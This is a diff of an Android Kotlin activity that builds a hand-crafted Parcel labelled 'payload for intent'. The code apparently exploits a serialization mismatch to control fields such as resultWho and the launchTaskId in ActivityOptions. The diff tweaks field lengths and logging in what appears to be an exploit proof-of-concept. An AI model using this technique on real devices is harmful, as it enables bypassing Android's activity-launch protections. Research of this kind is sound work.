@@ -18,11 +18,7 @@ import org.jetbrains.anko.button
 import org.jetbrains.anko.intentFor
 import org.jetbrains.anko.sdk27.coroutines.onClick
 import org.jetbrains.anko.verticalLayout
-
-fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
-fun <T> fixme(value: T) = value
-
-const val ValByteArray = 13
+import play.ground.Const.ValByteArray
 
 
 class IndexActivity : AppCompatActivity() {
@@ -36,7 +32,6 @@ class IndexActivity : AppCompatActivity() {
     verticalLayout {
       button("payload for intent") {
         onClick {
-
           val intent = Parcel.obtain().apply {
             intentFor<MainActivity>().writeToParcel(this, 0)
           }
@@ -48,8 +43,12 @@ class IndexActivity : AppCompatActivity() {
             writeString8("AAA") // text => binder
             writeInt(11) // alignment => cookie.1
             run {
-              writeInt(fixme(65)) // span text len => cookie.2
-              writeInt(65)  // p.12 => representation
+              writeInt(fixme(63)) // span text len => cookie.2
+
+
+              // we don't have a valid type ( sb*| sh* ), so no representation is read
+              // writeInt(65)  // p.12 => representation
+
               writeString(null) //  p.34 => resultWho(null)
               writeInt(0) // p.56 => requestCode
               writeInt(0) // p.78 => flags
@@ -97,13 +96,16 @@ class IndexActivity : AppCompatActivity() {
           val profiler = tail.readTypedObject(ProfilerInfo.CREATOR)
           val options = tail.readTypedObject(Bundle.CREATOR)
 
+          assert(ActivityOptions.fromBundle(options).launchTaskId == 1)
           Log.i(
             TAG,
             "resolvedType:$resolvedType, resultTo:$resultTo resultWho: $resultWho, requestCode:$requestCode startFlag:$startFlag profiler:$profiler, options:$options"
           )
 
-          assert(ActivityOptions.fromBundle(options).launchTaskId == 1)
-
+          Log.i(
+            TAG,
+            "_ -> ${options.getByteArray("_").size}"
+          )
 
         }
       }
